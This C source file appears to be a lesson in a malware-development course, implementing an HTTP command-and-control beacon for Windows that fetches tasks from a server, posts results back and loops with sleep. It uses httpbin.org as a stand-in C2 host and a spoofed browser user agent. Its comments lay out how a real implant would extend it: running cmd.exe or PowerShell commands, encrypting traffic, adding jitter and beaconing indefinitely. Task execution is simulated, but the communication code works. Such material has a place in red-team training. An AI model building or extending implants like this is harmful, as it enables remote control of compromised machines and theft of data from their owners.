/*
 * Lesson 04: C2 Callback Pattern
 *
 * This demonstrates the core HTTP-based C2 communication pattern:
 *
 * Beacon Check-in Pattern:
 * 1. Agent sends GET request to fetch tasks
 * 2. C2 server responds with commands/tasks
 * 3. Agent executes commands
 * 4. Agent POSTs results back to server
 * 5. Loop with sleep/jitter
 *
 * This is the foundation of HTTP C2 frameworks like:
 * - Cobalt Strike HTTP beacons
 * - Metasploit HTTP(S) payloads
 * - Sliver HTTP(S) C2
 * - Custom C2 frameworks
 *
 * Key Concepts:
 * - Task fetching (GET)
 * - Result exfiltration (POST)
 * - Error handling
 * - Beacon loop with sleep
 *
 * Note: This uses httpbin.org for demonstration.
 * In real C2, you'd have custom server endpoints.
 *
 * Compilation: cl /W4 04-http-callback.c /link winhttp.lib
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

// C2 Configuration
#define C2_SERVER       L"httpbin.org"
#define C2_PORT         INTERNET_DEFAULT_HTTP_PORT
#define TASK_ENDPOINT   L"/get"         // In real C2: /api/tasks or /beacon
#define RESULT_ENDPOINT L"/post"        // In real C2: /api/results or /beacon
#define BEACON_INTERVAL 5000            // 5 seconds (in real C2: 30-60 seconds)
#define MAX_RETRIES     3

typedef struct {
    char* data;
    DWORD size;
    DWORD capacity;
} Buffer;

void InitBuffer(Buffer* buf) {
    buf->data = NULL;
    buf->size = 0;
    buf->capacity = 0;
}

BOOL AppendToBuffer(Buffer* buf, const char* data, DWORD size) {
    if (buf->size + size > buf->capacity) {
        DWORD newCapacity = (buf->capacity == 0) ? 4096 : buf->capacity * 2;
        while (newCapacity < buf->size + size) {
            newCapacity *= 2;
        }

        char* newData = (char*)realloc(buf->data, newCapacity);
        if (!newData) return FALSE;

        buf->data = newData;
        buf->capacity = newCapacity;
    }

    memcpy(buf->data + buf->size, data, size);
    buf->size += size;
    return TRUE;
}

void FreeBuffer(Buffer* buf) {
    if (buf->data) {
        free(buf->data);
        buf->data = NULL;
    }
    buf->size = 0;
    buf->capacity = 0;
}

// Fetch tasks from C2 server
BOOL FetchTask(Buffer* taskData, DWORD* statusCode) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    wprintf(L"[*] Fetching task from C2...\n");

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        wprintf(L"[!] Failed to initialize session\n");
        return FALSE;
    }

    hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    if (!hConnect) {
        wprintf(L"[!] Failed to connect to C2 server\n");
        goto cleanup;
    }

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        TASK_ENDPOINT,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        wprintf(L"[!] Failed to create request\n");
        goto cleanup;
    }

    // Add custom headers (C2 identification)
    // In real C2: Agent ID, encryption keys, etc.
    wchar_t headers[] = L"X-Agent-ID: AGENT-12345\r\nX-Session: SESSION-67890";

    if (!WinHttpSendRequest(hRequest, headers, (DWORD)-1,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        wprintf(L"[!] Failed to send request\n");
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        wprintf(L"[!] Failed to receive response\n");
        goto cleanup;
    }

    // Check status code
    DWORD status = 0;
    DWORD statusSize = sizeof(status);

    WinHttpQueryHeaders(hRequest,
                       WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX,
                       &status,
                       &statusSize,
                       WINHTTP_NO_HEADER_INDEX);

    if (statusCode) {
        *statusCode = status;
    }

    if (status != 200) {
        wprintf(L"[!] Server returned status: %lu\n", status);
        goto cleanup;
    }

    // Read task data
    DWORD availableBytes = 0;
    char buffer[4096];

    do {
        availableBytes = 0;

        if (!WinHttpQueryDataAvailable(hRequest, &availableBytes)) {
            break;
        }

        if (availableBytes > 0) {
            DWORD bytesToRead = (availableBytes > sizeof(buffer)) ? sizeof(buffer) : availableBytes;
            DWORD bytesRead = 0;

            if (WinHttpReadData(hRequest, buffer, bytesToRead, &bytesRead)) {
                if (bytesRead > 0) {
                    AppendToBuffer(taskData, buffer, bytesRead);
                }
            }
        }

    } while (availableBytes > 0);

    wprintf(L"[+] Task received: %lu bytes\n", taskData->size);
    result = TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

// Send results back to C2 server
BOOL SendResults(const char* results, DWORD resultsSize, DWORD* statusCode) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    wprintf(L"[*] Sending results to C2...\n");

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) {
        wprintf(L"[!] Failed to initialize session\n");
        return FALSE;
    }

    hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    if (!hConnect) {
        wprintf(L"[!] Failed to connect to C2 server\n");
        goto cleanup;
    }

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        RESULT_ENDPOINT,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) {
        wprintf(L"[!] Failed to create request\n");
        goto cleanup;
    }

    // Headers for result submission
    wchar_t headers[] =
        L"Content-Type: application/json\r\n"
        L"X-Agent-ID: AGENT-12345\r\n"
        L"X-Session: SESSION-67890";

    if (!WinHttpSendRequest(hRequest, headers, (DWORD)-1,
                           (LPVOID)results, resultsSize, resultsSize, 0)) {
        wprintf(L"[!] Failed to send request\n");
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        wprintf(L"[!] Failed to receive response\n");
        goto cleanup;
    }

    // Check status code
    DWORD status = 0;
    DWORD statusSize = sizeof(status);

    WinHttpQueryHeaders(hRequest,
                       WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX,
                       &status,
                       &statusSize,
                       WINHTTP_NO_HEADER_INDEX);

    if (statusCode) {
        *statusCode = status;
    }

    if (status == 200) {
        wprintf(L"[+] Results sent successfully\n");
        result = TRUE;
    } else {
        wprintf(L"[!] Server returned status: %lu\n", status);
    }

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

// Simulate command execution
void ExecuteTask(const char* task, DWORD taskSize, Buffer* results) {
    // In real C2, this would:
    // 1. Parse the task/command
    // 2. Execute it (cmd.exe, PowerShell, built-in command)
    // 3. Capture output
    // 4. Return results

    wprintf(L"[*] Executing task...\n");

    // For demo, just create fake results
    const char* fakeResults =
        "{"
        "\"agent_id\":\"AGENT-12345\","
        "\"task_id\":\"TASK-001\","
        "\"status\":\"success\","
        "\"output\":\"Command executed successfully\","
        "\"timestamp\":1234567890"
        "}";

    AppendToBuffer(results, fakeResults, (DWORD)strlen(fakeResults));

    wprintf(L"[+] Task executed, %lu bytes of output\n", results->size);
}

void BeaconLoop(DWORD iterations) {
    DWORD checkInCount = 0;

    wprintf(L"\n[*] Starting beacon loop\n");
    wprintf(L"[*] C2 Server: %s:%lu\n", C2_SERVER, C2_PORT);
    wprintf(L"[*] Beacon Interval: %lu ms\n", BEACON_INTERVAL);
    wprintf(L"[*] Iterations: %lu\n\n", iterations);

    for (DWORD i = 0; i < iterations; i++) {
        Buffer taskData;
        Buffer results;
        DWORD statusCode = 0;

        InitBuffer(&taskData);
        InitBuffer(&results);

        checkInCount++;
        wprintf(L"\n========== Check-in #%lu ==========\n", checkInCount);

        // Step 1: Fetch task from C2
        if (FetchTask(&taskData, &statusCode)) {

            // Step 2: Execute task
            if (taskData.size > 0) {
                ExecuteTask(taskData.data, taskData.size, &results);

                // Step 3: Send results back
                if (results.size > 0) {
                    SendResults(results.data, results.size, &statusCode);
                }
            } else {
                wprintf(L"[*] No tasks available\n");
            }

        } else {
            wprintf(L"[!] Failed to fetch task (will retry next interval)\n");
        }

        FreeBuffer(&taskData);
        FreeBuffer(&results);

        // Step 4: Sleep before next beacon
        if (i < iterations - 1) {
            wprintf(L"[*] Sleeping for %lu ms...\n", BEACON_INTERVAL);
            Sleep(BEACON_INTERVAL);
        }
    }

    wprintf(L"\n[*] Beacon loop completed (%lu check-ins)\n", checkInCount);
}

int main(void) {
    wprintf(L"[*] C2 HTTP Callback Pattern Demo\n");
    wprintf(L"==================================\n");

    // Run 3 beacon iterations
    BeaconLoop(3);

    wprintf(L"\n[*] Demo completed\n");
    wprintf(L"\n[*] In a real C2 implant:\n");
    wprintf(L"    - Beacon loop runs indefinitely\n");
    wprintf(L"    - Tasks are parsed and executed\n");
    wprintf(L"    - Communication is encrypted\n");
    wprintf(L"    - Agent ID and session management\n");
    wprintf(L"    - Jitter added to sleep intervals\n");
    wprintf(L"    - Error handling and retry logic\n");

    return 0;
}
